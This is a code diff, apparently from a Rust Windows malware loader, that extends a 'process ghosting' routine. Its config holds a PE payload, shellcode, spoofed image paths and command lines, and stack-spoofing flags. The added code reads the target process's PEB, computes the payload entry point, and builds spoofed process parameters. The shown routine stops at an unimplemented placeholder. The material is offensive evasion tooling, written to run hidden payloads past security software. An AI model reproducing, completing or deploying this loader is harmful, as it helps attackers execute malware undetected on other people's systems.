@@ -6,10 +6,16 @@ use crate::core::nt;
 use crate::core::types::*;
 use crate::core::win32;
 
+const INTERACTIVE_DESKTOP: &[u16] = &[
+    0x0057, 0x0069, 0x006E, 0x0053, 0x0074, 0x0061, 0x0030, 0x005C, // WinSta0\
+    0x0044, 0x0065, 0x0066, 0x0061, 0x0075, 0x006C, 0x0074, 0x0000, // Default\0
+];
+
 pub struct Config<'a> {
     pub pe_payload: &'a [u8],
     pub shellcode: &'a [u8],
-    pub spoof_image_path: Option<&'a [u16]>,
+    pub spoof_image_path: &'a [u16],
+    pub spoof_command_line: Option<&'a [u16]>,
     pub enable_stack_spoof: bool,
     pub enable_ghosting: bool,
 }
@@ -231,6 +237,91 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     debug!("[GHOST] Ghost PID: {}", state.process_id);
 
     // TODO: Read remote PEB to get the image base then cmpute entry point
+    let mut remote_peb: Peb64 = core::mem::zeroed();
+    let mut bytes_read: usize = 0;
+
+    let status = nt::nt_read_virtual_memory(
+        state.process_handle, 
+        process_basic_information.peb_base_address, 
+        &mut remote_peb as *mut _ as *mut c_void, 
+        core::mem::size_of::<Peb64>(),
+        &mut bytes_read,
+    );
+
+    if status != STATUS_SUCCESS {
+        debug!("[GHOST] NtReadVirtualMemory (PEB) failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+
+    let e_lfanew = *(config.pe_payload.as_ptr().add(0x3C) as *const i32);
+    let optional_header = config.pe_payload.as_ptr().add(e_lfanew as usize + 4 + 20);
+    let entry_rva = *(optional_header.add(16) as *const u32) as usize; // OptionalHeader.AddressOfEntryPoint is at offset 16 from start of optional header
+
+    let image_base_field_offset = 0x10; // Peb64._reserved0[0] holds the image base, offset 0x10 in PEB   
+    let mut remote_image_base: usize = 0;
+    let status = nt::nt_read_virtual_memory(
+        state.process_handle, 
+        (process_basic_information.peb_base_address as usize + image_base_field_offset) as *mut c_void, 
+        &mut remote_image_base as *mut _ as *mut c_void, 
+        core::mem::size_of::<usize>(), 
+        &mut bytes_read
+    );
+
+    if status != STATUS_SUCCESS || remote_image_base == 0 {
+        debug!("[GHOST] NtReadVirtualMemory (image base) failed: 0x{:08X} base=0x{:X}", status, remote_image_base);
+        state.rollback();
+        return None;
+    }
+    debug!("[GHOST] Remote image base: 0x{:X}, entry RVA: 0x{:X}", remote_image_base, entry_rva);
+    
+    let entry_point = (remote_image_base + entry_rva) as *mut c_void;
+
+    let mut image_path = UnicodeString {
+        length: 0,
+        maximum_length: 0,
+        buffer: core::ptr::null(),
+    };
+    debug!("[GHOST] Setting image path to: {:?}", config.spoof_image_path);
+    win32::rtl_init_unicode_string(&mut image_path, config.spoof_image_path.as_ptr());
+
+    let cmd_ptr = config.spoof_command_line.map(|c| c.as_ptr()).unwrap_or(config.spoof_image_path.as_ptr());
+    let mut command_line = UnicodeString{
+        length: 0,
+        maximum_length: 0,
+        buffer: core::ptr::null(),
+    };
+    debug!("[GHOST] Setting command line to: {:?}", cmd_ptr);
+    win32::rtl_init_unicode_string(&mut command_line, cmd_ptr);
+
+    let mut desktop_info = UnicodeString {
+        length: 0,
+        maximum_length: 0,
+        buffer: core::ptr::null(),
+    };
+    debug!("[GHOST] Setting desktop info to: {:?}", INTERACTIVE_DESKTOP);
+    win32::rtl_init_unicode_string(&mut desktop_info, INTERACTIVE_DESKTOP.as_ptr());
+
+    let mut process_params: *mut c_void = null_mut();
+    let status = win32::rtl_create_process_parameters_ex(
+        &mut process_params,
+        &mut image_path,
+        null_mut(),             // DllPath
+        null_mut(),             // CurrentDirectory
+        &mut command_line,
+        null_mut(),             // Environment
+        null_mut(),             // WindowTitle
+        &mut desktop_info,      // DesktopInfo
+        null_mut(),             // ShellInfo
+        null_mut(),             // RuntimeData
+        0,                      // UnicodeString.Buffer
+    );
+    if status != STATUS_SUCCESS || process_params.is_null() {
+        debug!("[GHOST] RtlCreateProcessParametersEx failed: 0x{:08X}", status);
+        state.rollback();
+        return None;
+    }
+
     unimplemented!()
 }
 
